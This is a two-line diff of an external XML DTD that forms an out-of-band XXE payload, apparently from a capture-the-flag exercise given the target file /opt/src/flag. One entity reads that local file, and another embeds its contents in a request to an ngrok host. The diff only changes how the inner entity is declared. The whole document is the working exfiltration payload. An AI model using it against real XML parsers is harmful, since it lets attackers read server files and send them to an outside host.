@@ -1,2 +1,2 @@
 <!ENTITY % p1 SYSTEM "file:///opt/src/flag">
-<!ENTITY % p2 "<!ENTITY &#37; e1 SYSTEM 'http://0271f092.ngrok.io?%p1;'> ">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://0271f092.ngrok.io?%p1;'> ">
